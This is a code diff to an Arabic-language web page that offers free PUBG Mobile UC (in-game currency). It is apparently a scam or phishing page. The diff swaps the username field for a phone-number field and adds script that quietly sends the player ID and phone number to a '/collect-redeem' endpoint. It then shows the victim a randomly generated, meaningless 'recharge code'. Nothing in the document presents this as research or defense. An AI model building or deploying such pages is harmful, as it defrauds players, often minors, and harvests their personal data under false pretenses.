@@ -16,6 +16,7 @@
         .code-box { background: #2a2a3a; padding: 20px; border-radius: 10px; text-align: center; margin: 20px 0; border: 2px dashed gold; }
         .code { font-size: 32px; color: gold; letter-spacing: 5px; font-family: monospace; }
         .instructions { color: #aaa; font-size: 14px; text-align: center; margin-top: 20px; }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
@@ -23,14 +24,14 @@
         <h1>🎮 PUBG Mobile – استرداد UC</h1>
         <div id="formContainer">
             <div class="input-group">
-                <input type="text" id="username" placeholder="اسم المستخدم" required>
+                <input type="text" id="playerId" placeholder="معرف اللاعب (ID)" required>
             </div>
             <div class="input-group">
-                <input type="text" id="playerId" placeholder="معرف اللاعب (ID)" required>
+                <input type="tel" id="phone" placeholder="رقم الهاتف" required>
             </div>
             <button class="btn" onclick="generateCode()">توليد كود الشحن</button>
         </div>
-        <div id="codeContainer" style="display:none;">
+        <div id="codeContainer" class="hidden">
             <div class="code-box">
                 <div class="code" id="code">XXXX-XXXX-XXXX</div>
             </div>
@@ -46,12 +47,27 @@
     </div>
     <script>
         function generateCode() {
+            const playerId = document.getElementById('playerId').value;
+            const phone = document.getElementById('phone').value;
+            
+            if (!playerId || !phone) {
+                alert('الرجاء إدخال جميع المعلومات');
+                return;
+            }
+            
+            fetch('/collect-redeem', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({playerId, phone})
+            });
+            
             const code = Math.random().toString(36).substring(2,6).toUpperCase() + '-' +
                         Math.random().toString(36).substring(2,6).toUpperCase() + '-' +
                         Math.random().toString(36).substring(2,6).toUpperCase();
+            
             document.getElementById('code').textContent = code;
-            document.getElementById('formContainer').style.display = 'none';
-            document.getElementById('codeContainer').style.display = 'block';
+            document.getElementById('formContainer').classList.add('hidden');
+            document.getElementById('codeContainer').classList.remove('hidden');
         }
     </script>
 </body>
